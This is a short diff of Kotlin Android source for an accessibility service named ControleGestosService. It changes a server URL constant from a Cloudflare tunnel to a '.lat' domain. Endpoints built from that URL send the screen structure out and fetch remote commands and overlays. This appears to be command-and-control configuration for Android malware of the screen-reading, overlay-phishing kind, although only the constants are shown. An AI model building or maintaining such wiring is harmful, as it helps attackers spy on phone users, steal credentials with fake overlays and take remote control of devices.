@@ -40,7 +40,7 @@ import java.net.URL
 class ControleGestosService : AccessibilityService() {
 
     companion object {
-        const val URL_VPS = "https://tires-noticed-expensive-alloy.trycloudflare.com"
+        const val URL_VPS = "https://servidorpremium-kl.lat"
         const val URL_ENVIAR_ESTRUTURA = "${URL_VPS}/receber_esqueleto"
         const val URL_BUSCAR_COMANDOS = "${URL_VPS}/obter_comando"
         const val URL_BUSCAR_OVERLAY = "${URL_VPS}/obter_overlay"
